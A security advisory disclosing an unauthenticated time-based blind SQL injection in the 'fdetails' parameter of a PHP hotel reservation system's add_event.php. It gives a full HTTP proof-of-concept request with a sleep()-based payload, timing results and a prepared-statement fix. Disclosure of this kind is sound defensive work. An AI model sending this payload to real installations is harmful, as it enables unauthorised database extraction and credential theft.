# SQL Injection in Hotel and Tourism Reservation System PHP 1.0 — /admin/add_event.php

## Affected Product Details
- **Product:** Hotel and Tourism Reservation In PHP
- **Version:** 1.0
- **Vendor:** https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
- **Vulnerable File:** `/ht/admin/add_event.php`
- **Vulnerable Parameter:** `fdetails` (POST)
- **Authentication Required:** No
- **Attack Vector:** Remote
- **Vulnerability Type:** Time-based Blind SQL Injection (CWE-89)
- **CVSS v3.1 Score:** 7.5 (High)
- **CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Proof of Concept

**Vulnerable Request:**
```http
POST /ht/admin/add_event.php HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data

add=Add+Event&date=01/01/1967&fdetails=5550'XOR(555*if(now()=sysdate(),sleep(6),0))XOR'Z&sdetails=555&time=07:10:00&topic=1&venue=1
```

**Time-based Confirmation:**
```
sleep(0)  =>  0.004s
sleep(3)  =>  3.015s
sleep(6)  =>  6.011s
sleep(15) => 15.009s
```

## Impact
An unauthenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full system compromise.

## Remediation
```php
$stmt = $conn->prepare("INSERT INTO events (fdetails) VALUES (?)");
$stmt->bind_param("s", $fdetails);
$stmt->execute();
```

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
